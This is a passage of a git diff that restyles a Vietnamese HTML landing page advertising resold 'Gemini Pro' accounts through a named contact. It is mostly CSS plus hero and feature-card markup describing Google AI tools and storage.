@@ -3,92 +3,828 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mở Khóa Sức Mạnh AI Đỉnh Cao - Gemini Pro</title>
+    <title>Mở Khóa Sức Mạnh AI Đỉnh Cao - Gemini Pro Chính Chủ</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400;1,600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; background: #f4f7f6; margin: 0; padding: 0; }
-        .header { background: linear-gradient(135deg, #1a73e8, #0056b3); color: white; padding: 60px 20px; text-align: center; }
-        .header h1 { margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; }
-        .header p { font-size: 18px; max-width: 700px; margin: 20px auto 0; font-weight: 500; }
-        .container { max-width: 800px; margin: 40px auto; padding: 0 20px; }
-        .section-title { color: #1a73e8; font-size: 24px; border-bottom: 2px solid #e0e0e0; padding-bottom: 10px; margin-top: 40px; margin-bottom: 25px; font-weight: bold;}
-        .feature-item { background: white; padding: 20px 25px; border-radius: 8px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); border-left: 4px solid #1a73e8; }
-        .feature-item strong { display: block; color: #2c3e50; font-size: 18px; margin-bottom: 5px; }
-        .contact-box { background: #e8f0fe; padding: 25px; border-radius: 8px; text-align: center; margin: 40px 0; border: 1px solid #c2e0ff; }
-        .contact-box h2 { color: #1a73e8; margin-top: 0; font-size: 22px;}
-        .contact-box p { font-size: 16px; margin: 10px 0; color: #555;}
-        .contact-box .phone { font-size: 24px; font-weight: bold; color: #d32f2f; display: block; margin-top: 10px;}
-        .form-box { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.1); text-align: center; margin-top: 50px; margin-bottom: 50px; border-top: 5px solid #1a73e8;}
-        .form-box h3 { margin-top: 0; color: #333; font-size: 22px; margin-bottom: 10px;}
-        .form-box p { color: #666; margin-bottom: 20px; }
-        .warning-box { background: #fff4f4; border: 2px dashed #d32f2f; color: #d32f2f; padding: 15px; border-radius: 8px; font-weight: bold; font-size: 15px; margin-bottom: 25px; text-align: left;}
-        .form-box input { width: 90%; max-width: 400px; padding: 14px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; display: block; margin-left: auto; margin-right: auto; transition: 0.3s;}
-        .form-box input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 5px rgba(26,115,232,0.3);}
-        .pin-input { font-weight: bold; color: #d32f2f; text-align: center; letter-spacing: 2px;}
-        .form-box button { background: #1a73e8; color: white; border: none; padding: 16px 30px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; width: 90%; max-width: 428px; transition: 0.2s; margin-top: 10px;}
-        .form-box button:hover { background: #1557b0; }
-        #popupOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; z-index: 1000; }
-        .popup-content { background: white; padding: 40px 30px; border-radius: 12px; text-align: center; max-width: 500px; width: 90%; box-shadow: 0 15px 35px rgba(0,0,0,0.2); animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        .popup-content h3 { color: #2e7d32; font-size: 26px; margin-top: 0; margin-bottom: 15px;}
-        .popup-content p { color: #555; font-size: 16px; margin-bottom: 30px; line-height: 1.5; }
-        .btn-upgrade-popup { background: #1a73e8; color: white; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 20px; font-weight: bold; cursor: pointer; line-height: 1.4; transition: 0.2s;}
-        .btn-upgrade-popup:hover { background: #1557b0; }
-        .btn-upgrade-popup:disabled { background: #999; cursor: not-allowed; }
-        .email-highlight { color: #d32f2f; display: block; font-size: 22px; margin-top: 5px;}
-        .note { font-size: 13px; color: #888; text-align: center; margin-top: 30px; font-style: italic; }
-        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        :root {
+            --bg: #070913;
+            --bg-card: rgba(17, 23, 44, 0.68);
+            --bg-card-hover: rgba(24, 33, 62, 0.85);
+            --border-card: rgba(255, 255, 255, 0.08);
+            --border-glow: rgba(59, 130, 246, 0.45);
+            --text-main: #f8fafc;
+            --text-heading: #ffffff;
+            --text-muted: #94a3b8;
+            --text-muted-light: #cbd5e1;
+            --primary: #2563eb;
+            --primary-glow: rgba(37, 99, 235, 0.35);
+            --accent-cyan: #38bdf8;
+            --accent-amber: #f59e0b;
+            --accent-emerald: #10b981;
+            --accent-rose: #f43f5e;
+            --radius-lg: 24px;
+            --radius-md: 16px;
+            --radius-sm: 10px;
+            --radius-full: 9999px;
+            --glass-blur: blur(20px) saturate(180%);
+            --shadow-card: 0 10px 30px -5px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            --shadow-hover: 0 25px 50px -10px rgba(0, 0, 0, 0.7), 0 0 30px rgba(59, 130, 246, 0.22), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Plus Jakarta Sans', 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            line-height: 1.7;
+            color: var(--text-main);
+            background-color: var(--bg);
+            background-image:
+                radial-gradient(ellipse 900px 600px at 15% -5%, rgba(37, 99, 235, 0.18) 0%, transparent 60%),
+                radial-gradient(ellipse 800px 550px at 85% 10%, rgba(139, 92, 246, 0.16) 0%, transparent 60%),
+                radial-gradient(ellipse 900px 700px at 50% 50%, rgba(16, 185, 129, 0.06) 0%, transparent 65%),
+                radial-gradient(ellipse 800px 600px at 20% 90%, rgba(245, 158, 11, 0.08) 0%, transparent 60%);
+            background-attachment: fixed;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 10px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 999px;
+            border: 2px solid var(--bg);
+        }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary); }
+
+        .container {
+            max-width: 920px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* ================= HERO HEADER ================= */
+        .hero {
+            padding: 85px 20px 65px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .badge-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 7px 18px;
+            border-radius: var(--radius-full);
+            background: rgba(37, 99, 235, 0.12);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            color: var(--accent-cyan);
+            font-size: 13px;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            margin-bottom: 22px;
+            box-shadow: 0 0 20px rgba(37, 99, 235, 0.2);
+        }
+
+        .badge-pill::before {
+            content: "";
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: var(--accent-cyan);
+            box-shadow: 0 0 10px var(--accent-cyan);
+            animation: pulseDot 2s infinite ease-in-out;
+        }
+
+        @keyframes pulseDot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.85); }
+        }
+
+        .hero h1 {
+            font-size: clamp(2.4rem, 5.5vw, 3.8rem);
+            font-weight: 900;
+            line-height: 1.15;
+            letter-spacing: -0.04em;
+            margin-bottom: 18px;
+            background: linear-gradient(135deg, #ffffff 30%, #bfdbfe 70%, #60a5fa 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 45px rgba(59, 130, 246, 0.2);
+        }
+
+        .hero-sub {
+            font-size: clamp(16px, 2.2vw, 19px);
+            max-width: 760px;
+            margin: 0 auto;
+            color: var(--text-muted-light);
+            font-weight: 500;
+            line-height: 1.7;
+        }
+
+        .intro-lead {
+            font-size: 18px;
+            text-align: center;
+            margin: 40px auto;
+            color: #dbeafe;
+            background: rgba(37, 99, 235, 0.08);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            padding: 24px 28px;
+            border-radius: var(--radius-lg);
+            backdrop-filter: var(--glass-blur);
+            box-shadow: var(--shadow-card);
+            line-height: 1.75;
+        }
+
+        .intro-lead strong {
+            color: #fff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+
+        /* ================= SECTION HEADINGS ================= */
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #fff;
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin: 55px 0 28px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .section-title span.icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 38px;
+            height: 38px;
+            border-radius: 12px;
+            background: rgba(37, 99, 235, 0.15);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            font-size: 20px;
+            box-shadow: 0 0 15px rgba(37, 99, 235, 0.25);
+        }
+
+        /* ================= CARDS & GLASSMORPHISM ================= */
+        .glass-card {
+            background: var(--bg-card);
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            border: 1px solid var(--border-card);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-card);
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1),
+                        box-shadow 0.35s cubic-bezier(0.16, 1, 0.3, 1),
+                        border-color 0.35s cubic-bezier(0.16, 1, 0.3, 1),
+                        background 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .glass-card:hover {
+            transform: translateY(-5px) scale(1.006);
+            background: var(--bg-card-hover);
+            border-color: var(--border-glow);
+            box-shadow: var(--shadow-hover);
+        }
+
+        /* Feature items */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
+            gap: 20px;
+            margin-bottom: 45px;
+        }
+
+        .feature-item {
+            padding: 24px 26px;
+            border-left: 4px solid var(--primary);
+        }
+
+        .feature-item:hover {
+            border-left-color: var(--accent-cyan);
+        }
+
+        .feature-item strong {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .feature-item p {
+            color: var(--text-muted-light);
+            font-size: 15px;
+            line-height: 1.65;
+            margin: 0;
+        }
+
+        /* ================= ECOSYSTEM SHOWCASE ================= */
+        .ecosystem-box {
+            padding: 36px 32px;
+            margin: 45px 0;
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            background:
+                radial-gradient(ellipse 600px 400px at top right, rgba(37, 99, 235, 0.16), transparent 50%),
+                radial-gradient(ellipse 600px 400px at bottom left, rgba(139, 92, 246, 0.14), transparent 50%),
+                rgba(17, 23, 44, 0.75);
+        }
+
+        .ecosystem-box h2 {
+            font-size: clamp(22px, 3.2vw, 28px);
+            font-weight: 900;
+            letter-spacing: -0.03em;
+            text-align: center;
+            margin-bottom: 24px;
+            background: linear-gradient(135deg, #ffffff 40%, #93c5fd 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .specialist-list {
+            background: rgba(30, 41, 75, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-left: 4px solid var(--accent-cyan);
+            border-radius: var(--radius-md);
+            padding: 22px 24px;
+            margin-bottom: 30px;
+        }
+
+        .specialist-list p.title {
+            font-size: 16.5px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 14px;
+        }
+
+        .specialist-items {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
+            gap: 12px;
+        }
+
+        .specialist-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 15px;
+            color: var(--text-muted-light);
+        }
+
+        .specialist-row strong {
+            color: #fff;
+        }
+
+        .sub-block-title {
+            color: var(--accent-cyan);
+            font-size: 19px;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin: 32px 0 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .sub-block-desc {
+            font-style: italic;
+            color: var(--text-muted);
+            margin-bottom: 18px;
+            font-size: 14.5px;
+        }
+
+        .models-grid {
+            display: grid;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+
+        .model-chip {
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            padding: 14px 18px;
+            border-radius: var(--radius-md);
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            transition: all 0.25s ease;
+        }
+
+        .model-chip:hover {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(59, 130, 246, 0.3);
+            transform: translateX(4px);
+        }
+
+        .model-chip .icon { font-size: 22px; line-height: 1; margin-top: 2px; }
+        .model-chip .desc strong { color: #fff; font-size: 15.5px; }
+        .model-chip .desc { color: var(--text-muted-light); font-size: 14.5px; line-height: 1.6; }
+
+        /* Workspace tools grid */
+        .workspace-grid {
+            display: grid;
+            grid-template-columns: repeat(3, minmax(0, 1fr));
+            gap: 16px;
+            margin-bottom: 30px;
+        }
+
+        .ws-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            border-radius: var(--radius-md);
+            padding: 20px;
+            transition: all 0.25s ease;
+        }
+
+        .ws-card:hover {
+            border-color: rgba(59, 130, 246, 0.35);
+            background: rgba(37, 99, 235, 0.06);
+            transform: translateY(-3px);
+        }
+
+        .ws-card-title {
+            color: var(--accent-cyan);
+            font-size: 15.5px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .ws-card ul {
+            list-style: none;
+            padding: 0;
+            display: grid;
+            gap: 8px;
+            font-size: 13.5px;
+            color: var(--text-muted-light);
+            line-height: 1.5;
+        }
+
+        .ws-card ul strong { color: #fff; }
+
+        .cta-slogan {
+            font-weight: 900;
+            font-size: clamp(19px, 3vw, 24px);
+            color: #fff;
+            text-transform: uppercase;
+            margin: 40px 0 25px;
+            text-align: center;
+            line-height: 1.35;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #ffffff 20%, #fde047 60%, #f97316 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(245, 158, 11, 0.2);
+        }
+
+        /* ================= CONTACT CARD ================= */
+        .contact-card {
+            background: linear-gradient(135deg, rgba(30, 41, 75, 0.7) 0%, rgba(17, 24, 48, 0.9) 100%);
+            border: 1.5px solid rgba(59, 130, 246, 0.4);
+            border-radius: var(--radius-lg);
+            padding: 30px 24px;
+            max-width: 420px;
+            margin: 30px auto 0;
+            text-align: center;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4), 0 0 25px rgba(37, 99, 235, 0.25);
+            transition: all 0.3s ease;
+        }
+
+        .contact-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.5), 0 0 35px rgba(37, 99, 235, 0.35);
+            border-color: var(--accent-cyan);
+        }
+
+        .contact-name {
+            font-size: 20px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: -0.02em;
+        }
+
+        .contact-phone {
+            font-size: clamp(26px, 4vw, 32px);
+            font-weight: 900;
+            color: var(--accent-rose);
+            margin: 10px 0 6px;
+            letter-spacing: 2px;
+            display: inline-block;
+            text-shadow: 0 0 20px rgba(244, 63, 94, 0.4);
+        }
+
+        .contact-note {
+            font-size: 14px;
+            color: var(--text-muted);
+            font-style: italic;
+        }
+
+        /* ================= REGISTRATION FORM BOX ================= */
+        .form-box {
+            padding: 45px 36px;
+            border-radius: var(--radius-lg);
+            border: 1.5px solid rgba(59, 130, 246, 0.35);
+            background:
+                radial-gradient(circle at top center, rgba(37, 99, 235, 0.18), transparent 50%),
+                rgba(17, 23, 44, 0.85);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.15);
+            text-align: center;
+            margin: 60px 0 30px;
+        }
+
+        .form-box h3 {
+            font-size: clamp(24px, 3.5vw, 30px);
+            font-weight: 900;
+            letter-spacing: -0.03em;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #ffffff 40%, #93c5fd 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .form-box p.form-desc {
+            color: var(--text-muted-light);
+            font-size: 16px;
+            margin-bottom: 24px;
+        }
+
+        .warning-box {
+            background: rgba(244, 63, 94, 0.08);
+            border: 1.5px dashed rgba(244, 63, 94, 0.4);
+            color: #fca5a5;
+            padding: 16px 20px;
+            border-radius: var(--radius-md);
+            font-weight: 600;
+            font-size: 14.5px;
+            line-height: 1.6;
+            margin-bottom: 28px;
+            text-align: left;
+            box-shadow: 0 0 20px rgba(244, 63, 94, 0.08);
+        }
+
+        .warning-box strong { color: #fecdd3; }
+
+        .form-box input {
+            width: 100%;
+            max-width: 460px;
+            padding: 16px 20px;
+            margin-bottom: 16px;
+            border: 1.5px solid rgba(255, 255, 255, 0.12);
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            font-family: inherit;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            background: rgba(10, 14, 28, 0.7);
+            color: #ffffff;
+            transition: all 0.3s ease;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.4);
+        }
+
+        .form-box input::placeholder {
+            color: #64748b;
+        }
+
+        .form-box input:focus {
+            border-color: var(--accent-cyan);
+            outline: none;
+            background: rgba(14, 20, 40, 0.9);
+            box-shadow: 0 0 20px rgba(56, 189, 248, 0.35), inset 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .pin-input {
+            font-weight: 800;
+            color: #fde047 !important;
+            text-align: center;
+            letter-spacing: 3px;
+            font-size: 18px !important;
+            border-color: rgba(245, 158, 11, 0.4) !important;
+            box-shadow: 0 0 15px rgba(245, 158, 11, 0.15) !important;
+        }
+
+        .pin-input:focus {
+            border-color: #f59e0b !important;
+            box-shadow: 0 0 25px rgba(245, 158, 11, 0.4) !important;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #1d4ed8 0%, #2563eb 50%, #38bdf8 100%);
+            color: #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 18px 34px;
+            border-radius: var(--radius-full);
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            max-width: 460px;
+            transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+            margin-top: 10px;
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.45), inset 0 1px 0 rgba(255, 255, 255, 0.4);
+            letter-spacing: 0.02em;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 16px 40px rgba(37, 99, 235, 0.65), 0 0 25px rgba(56, 189, 248, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.6);
+        }
+
+        .btn-submit:active {
+            transform: translateY(-1px);
+        }
+
+        .note {
+            font-size: 13.5px;
+            color: var(--text-muted);
+            text-align: center;
+            margin: 25px 0 50px;
+            font-style: italic;
+        }
+
+        /* ================= POPUP MODAL ================= */
+        #popupOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(3, 7, 18, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .popup-content {
+            background:
+                radial-gradient(circle at top center, rgba(37, 99, 235, 0.25), transparent 60%),
+                rgba(17, 23, 44, 0.95);
+            border: 1.5px solid rgba(59, 130, 246, 0.45);
+            padding: 44px 34px;
+            border-radius: var(--radius-lg);
+            text-align: center;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(37, 99, 235, 0.3);
+            animation: popIn 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .popup-content h3 {
+            color: var(--accent-emerald);
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 14px;
+            letter-spacing: -0.02em;
+        }
+
+        .popup-content p {
+            color: var(--text-muted-light);
+            font-size: 16px;
+            margin-bottom: 28px;
+            line-height: 1.6;
+        }
+
+        .email-highlight {
+            color: #60a5fa;
+            display: block;
+            font-size: 21px;
+            font-weight: 800;
+            margin-top: 6px;
+            word-break: break-all;
+        }
+
+        .btn-upgrade-popup {
+            background: linear-gradient(135deg, #1d4ed8 0%, #2563eb 50%, #38bdf8 100%);
+            color: #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 18px 24px;
+            width: 100%;
+            border-radius: var(--radius-md);
+            font-size: 19px;
+            font-weight: 800;
+            cursor: pointer;
+            line-height: 1.4;
+            transition: all 0.25s ease;
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.45);
+        }
+
+        .btn-upgrade-popup:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 16px 40px rgba(37, 99, 235, 0.65);
+        }
+
+        .btn-upgrade-popup:disabled {
+            background: #475569;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.85); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* ================= RESPONSIVE ================= */
+        @media (max-width: 860px) {
+            .features-grid, .specialist-items, .workspace-grid {
+                grid-template-columns: 1fr;
+            }
+            .hero { padding: 60px 16px 40px; }
+            .form-box { padding: 32px 20px; }
+            .ecosystem-box { padding: 28px 20px; }
+        }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>🚀 Mở Khóa Sức Mạnh AI Đỉnh Cao</h1>
-        <p>GEMINI PRO CHÍNH CHỦ – TRỢ LÝ AI CHO CÔNG VIỆC & CUỘC SỐNG</p>
-    </div>
+
+    <!-- HERO HEADER -->
+    <header class="hero">
+        <div class="badge-pill">🚀 GOOGLE AI WORKSPACE • GEMINI PRO CHÍNH CHỦ</div>
+        <h1>Mở Khóa Sức Mạnh AI Đỉnh Cao</h1>
+        <p class="hero-sub">TRỢ LÝ AI ĐỘT PHÁ CHO CÔNG VIỆC, GIẢNG DẠY, NGHIÊN CỨU &amp; CUỘC SỐNG</p>
+    </header>
+
     <div class="container">
-        <p style="font-size: 18px; text-align: center; margin-bottom: 40px;">Bạn đang muốn khai thác AI ở một cấp độ mạnh mẽ và chuyên nghiệp hơn?<br>
-        <strong>Gemini Pro chính chủ</strong> mang đến trải nghiệm AI tiên tiến, hỗ trợ bạn từ <strong>công việc, học tập, giảng dạy, nghiên cứu đến sáng tạo nội dung</strong> – nhanh hơn, thông minh hơn và hiệu quả hơn.</p>
         
-        <h2 class="section-title">✨ VÌ SAO NÊN CHỌN GEMINI PRO?</h2>
-        <div class="feature-item"><strong>🚀 Công nghệ AI tiên tiến</strong>Tiếp cận các mô hình và tính năng AI mạnh mẽ, hỗ trợ xử lý những công việc phức tạp.</div>
-        <div class="feature-item"><strong>⚡ Tăng tốc hiệu suất làm việc</strong>Soạn thảo, phân tích, tổng hợp, nghiên cứu và xử lý thông tin nhanh chóng.</div>
-        <div class="feature-item"><strong>📚 Đặc biệt hữu ích cho giáo viên & người học</strong>Hỗ trợ xây dựng giáo án, bài giảng, câu hỏi, tài liệu học tập và nhiều nội dung chuyên môn.</div>
-        <div class="feature-item"><strong>🧠 Trợ lý AI đa năng</strong>Từ ý tưởng ban đầu đến sản phẩm hoàn chỉnh – AI đồng hành cùng bạn trong từng bước.</div>
-        <div class="feature-item"><strong>🔐 Tài khoản chính chủ – sử dụng an tâm</strong>Thông tin tài khoản rõ ràng, minh bạch, hạn chế những rủi ro thường gặp từ các nguồn tài khoản không xác định.</div>
-        <div class="feature-item"><strong>🛡️ Hỗ trợ tận tình</strong>Không chỉ cung cấp tài khoản, <strong>Ms Huyền</strong> sẵn sàng hỗ trợ và hướng dẫn bạn trong quá trình sử dụng.</div>
-        
-        <div class="contact-box">
-            <h2>🎯 MỘT TÀI KHOẢN – MỞ RA CẢ MỘT HỆ SINH THÁI AI</h2>
-            <p>Cho dù bạn là giáo viên, sinh viên, nhân viên văn phòng, nhà sáng tạo nội dung, chủ doanh nghiệp hay đơn giản là người muốn tận dụng AI để làm việc hiệu quả hơn – Gemini Pro có thể trở thành trợ lý AI đắc lực của bạn mỗi ngày.</p>
-            <p style="font-weight: bold; font-size: 20px; color: #333; margin-top: 20px;">Đừng chỉ sử dụng AI. HÃY BẮT ĐẦU LÀM CHỦ AI.</p>
-            <hr style="border: 0; border-top: 1px solid #c2e0ff; margin: 25px 0;">
-            <h2>📞 TƯ VẤN & ĐĂNG KÝ</h2>
-            <p>Hãy liên hệ ngay để được tư vấn gói phù hợp, hướng dẫn đăng ký và hỗ trợ sử dụng.</p>
-            <strong>Ms Huyền</strong>
-            <span class="phone">07.6666.7999</span>
+        <div class="intro-lead">
+            Bạn đang muốn khai thác AI ở một cấp độ mạnh mẽ và chuyên nghiệp hơn?<br>
+            <strong>Gemini Pro chính chủ</strong> mang đến trải nghiệm AI tiên tiến, hỗ trợ bạn từ <strong>công việc, học tập, giảng dạy, nghiên cứu đến sáng tạo nội dung</strong> – nhanh hơn, thông minh hơn và hiệu quả vượt trội.
         </div>
         
-        <div class="form-box">
+        <!-- SECTION 1: VÌ SAO NÊN CHỌN -->
+        <h2 class="section-title"><span class="icon">✨</span> VÌ SAO NÊN CHỌN GEMINI PRO?</h2>
+        
+        <div class="features-grid">
+            <div class="glass-card feature-item">
+                <strong><span>🚀</span> Công nghệ AI tiên tiến</strong>
+                <p>Tiếp cận các mô hình và tính năng AI mạnh mẽ nhất của Google, hỗ trợ giải quyết những bài toán phức tạp.</p>
+            </div>
+            
+            <div class="glass-card feature-item">
+                <strong><span>⚡</span> Tăng tốc hiệu suất làm việc</strong>
+                <p>Soạn thảo, phân tích bảng tính, tổng hợp tài liệu, nghiên cứu và xử lý lượng thông tin khổng lồ trong tích tắc.</p>
+            </div>
+            
+            <div class="glass-card feature-item">
+                <strong><span>📚</span> Tối ưu cho giáo viên &amp; học thuật</strong>
+                <p>Hỗ trợ soạn giáo án chuẩn mực, thiết kế bài giảng, tạo ngân hàng câu hỏi và tài liệu học tập chuyên môn.</p>
+            </div>
+            
+            <div class="glass-card feature-item">
+                <strong><span>🧠</span> Trợ lý AI đa năng toàn diện</strong>
+                <p>Từ ý tưởng ban đầu đến sản phẩm hoàn chỉnh – AI đồng hành và phản hồi cùng bạn trong từng bước.</p>
+            </div>
+            
+            <div class="glass-card feature-item">
+                <strong><span>🔐</span> Tài khoản chính chủ – sử dụng an tâm</strong>
+                <p>Thông tin tài khoản rõ ràng, kích hoạt an toàn, không lo rủi ro bị khóa hay mất dữ liệu.</p>
+            </div>
+            
+            <div class="glass-card feature-item">
+                <strong><span>🛡️</span> Hỗ trợ tận tâm từ chuyên gia</strong>
+                <p>Được chuyên gia AI hướng dẫn trực tiếp quy trình sử dụng, khai thác triệt để các tính năng nâng cao.</p>
+            </div>
+        </div>
+        
+        <!-- SECTION 2: HỆ SINH THÁI 5 TRONG 1 -->
+        <div class="glass-card ecosystem-box">
+            <h2>🎯 1 TÀI KHOẢN – MỞ KHÓA TOÀN BỘ HỆ SINH THÁI AI</h2>
+
+            <div class="specialist-list">
+                <p class="title">💡 Sở hữu 1 tài khoản Gemini Pro tương đương cùng lúc:</p>
+                <div class="specialist-items">
+                    <div class="specialist-row"><span>✍️</span> <span><strong>1 Chuyên gia viết lách</strong> (Google Docs)</span></div>
+                    <div class="specialist-row"><span>📈</span> <span><strong>1 Kế toán phân tích dữ liệu</strong> (Google Sheets)</span></div>
+                    <div class="specialist-row"><span>🎨</span> <span><strong>1 Họa sĩ / Nhà làm phim</strong> (Imagen 4 / Veo 3)</span></div>
+                    <div class="specialist-row"><span>💻</span> <span><strong>1 Lập trình viên cao cấp</strong> (AI Studio / Colab)</span></div>
+                    <div class="specialist-row" style="grid-column: 1 / -1;"><span>💾</span> <span><strong>1 Ổ cứng đám mây 5TB lưu trữ khổng lồ</strong> (Google Drive)</span></div>
+                </div>
+            </div>
+
+            <!-- Core Models -->
+            <h3 class="sub-block-title">⚡ 1. Các Mô hình AI Cốt lõi (AI Core Models)</h3>
+            <p class="sub-block-desc">Những bộ não AI thế hệ tân tiến nhất phục vụ mọi tác vụ chuyên biệt:</p>
+            
+            <div class="models-grid">
+                <div class="model-chip">
+                    <span class="icon">🤖</span>
+                    <div class="desc"><strong>Gemini Pro (1.5 / 3.1 Pro):</strong> AI ngôn ngữ ngữ cảnh 1-2 triệu token, đọc cùng lúc hàng chục file PDF, sách dày hoặc toàn bộ kho code.</div>
+                </div>
+                <div class="model-chip">
+                    <span class="icon">🧠</span>
+                    <div class="desc"><strong>Gemini Deep Think:</strong> Chế độ suy luận sâu, giải bài toán logic phức tạp, thiết kế kiến trúc hệ thống và lập trình bậc cao.</div>
+                </div>
+                <div class="model-chip">
+                    <span class="icon">🎨</span>
